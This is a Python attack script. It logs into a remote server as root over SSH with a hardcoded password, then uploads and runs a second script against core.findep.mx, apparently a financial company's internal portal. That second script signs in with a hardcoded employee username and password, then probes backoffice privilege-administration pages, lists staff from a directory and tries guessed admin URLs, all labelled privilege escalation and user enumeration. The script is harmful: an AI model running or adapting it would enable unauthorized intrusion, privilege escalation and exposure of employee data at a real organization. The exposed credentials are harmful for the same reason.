import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b JSESSIONID={s.cookies.get('JSESSIONID','?')}\n\n")

if len(r.text) < 15000:
    sys.stdout.write("LOGIN FAILED - ABORT\n")
    sys.exit(1)

# ====================================================
# BACKOFFICE - PRIVILEGE ADMINISTRATION
# ====================================================
sys.stdout.write("="*60 + "\n=== BACKOFFICE PRIVESC EXPLORATION ===\n" + "="*60 + "\n\n")

# 1. adm_perfil.do - privilege admin
sys.stdout.write("--- adm_perfil.do ---\n")
r = s.get("https://core.findep.mx/backoffice/adm_perfil.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")

# Extract full page structure
title = re.search(r'<title>(.*?)</title>', r.text[:3000])
sys.stdout.write(f"Title: {title.group(1) if title else 'N/A'}\n")

forms = re.findall(r'<form[^>]*action="([^"]*)"[^>]*name="([^"]*)"', r.text)
sys.stdout.write(f"Forms: {forms}\n")

# All inputs
inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
sys.stdout.write(f"Inputs: {inputs[:30]}\n")

# Select options (roles/modules)
selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
for sel_name, sel_body in selects:
    options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
    sys.stdout.write(f"\nSelect '{sel_name}': {options[:30]}\n")

# Check for user list / role list
if "perfil" in r.text.lower() or "privilegio" in r.text.lower() or "modulo" in r.text.lower():
    ctx = re.findall(r'(?:perfil|privilegio|modulo|permiso|rol|acceso)[^<]{0,200}', r.text, re.I)
    sys.stdout.write(f"Privilege context: {ctx[:10]}\n")

# Links
links = re.findall(r'(?:href|action)=["\']([^"\']+)["\']', r.text)
sys.stdout.write(f"All links: {[l for l in links if '.do' in l or '.jsp' in l][:20]}\n")

# Dump body
sys.stdout.write(f"\n--- BODY (first 3000) ---\n{r.text[:3000]}\n")
sys.stdout.write(f"\n--- BODY (3000-6000) ---\n{r.text[3000:6000]}\n")

# 2. Help Desk
sys.stdout.write("\n\n--- admon_help_desk.do ---\n")
r2 = s.get("https://core.findep.mx/backoffice/admon_help_desk.do", timeout=15)
sys.stdout.write(f"[{r2.status_code}] {len(r2.text)}b\n")
forms2 = re.findall(r'<form[^>]*action="([^"]*)"', r2.text)
sys.stdout.write(f"Forms: {forms2}\n")
selects2 = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r2.text, re.S)
for sel_name, sel_body in selects2:
    options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
    sys.stdout.write(f"  Select '{sel_name}': {options[:15]}\n")

# 3. Admin modulo RH
sys.stdout.write("\n\n--- admon_modulorh.do ---\n")
r3 = s.get("https://core.findep.mx/backoffice/admon_modulorh.do", timeout=15)
sys.stdout.write(f"[{r3.status_code}] {len(r3.text)}b\n")

# 4. Admin ToDos
sys.stdout.write("\n--- admon_toDos.do ---\n")
r4 = s.get("https://core.findep.mx/backoffice/admon_toDos.do", timeout=15)
sys.stdout.write(f"[{r4.status_code}] {len(r4.text)}b\n")

# 5. Directorio personal - enumerate users
sys.stdout.write("\n\n--- directorio_personal.do (user enum) ---\n")
r5 = s.get("https://core.findep.mx/directorio/directorio_personal.do", timeout=15)
sys.stdout.write(f"[{r5.status_code}] {len(r5.text)}b\n")
# Extract user names/IDs
users = re.findall(r'(?:usuario|empleado|nombre|cve_usr|user_id|id_emp)[^<]{0,200}', r5.text, re.I)
sys.stdout.write(f"User refs: {users[:20]}\n")
forms5 = re.findall(r'<form[^>]*action="([^"]*)"', r5.text)
selects5 = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r5.text, re.S)
for sel_name, sel_body in selects5:
    options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
    sys.stdout.write(f"  Select '{sel_name}': {options[:20]}\n")
sys.stdout.write(f"  Forms: {forms5}\n")
sys.stdout.write(f"  Body snippet: {r5.text[:2000]}\n")

# 6. Try modifying own profile - look for Finanzas module
sys.stdout.write("\n\n--- Try GET various admin paths ---\n")
admin_paths = [
    "/backoffice/adm_perfil.do?action=edit",
    "/backoffice/adm_perfil.do?action=list",
    "/backoffice/adm_perfil.do?id=1",
    "/backoffice/adm_usuarios.do",
    "/backoffice/adm_modulos.do",
    "/backoffice/adm_roles.do",
    "/backoffice/usuarios.do",
    "/backoffice/perfiles.do",
    "/backoffice/asignar_perfil.do",
    "/backoffice/grdaPerfil.do",
    "/backoffice/editaPerfil.do",
    "/backoffice/eliminaPerfil.do",
    "/backoffice/consultaPerfil.do",
    "/backoffice/guardaPerfil.do",
]
for p in admin_paths:
    try:
        r = s.get(f"https://core.findep.mx{p}", timeout=8, allow_redirects=False)
        if r.status_code != 404 and len(r.text) != 1149:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
            if r.status_code == 200 and len(r.text) > 2000:
                sys.stdout.write(f"    Snippet: {r.text[:500]}\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_privesc.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_privesc.py 2>&1', timeout=180)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
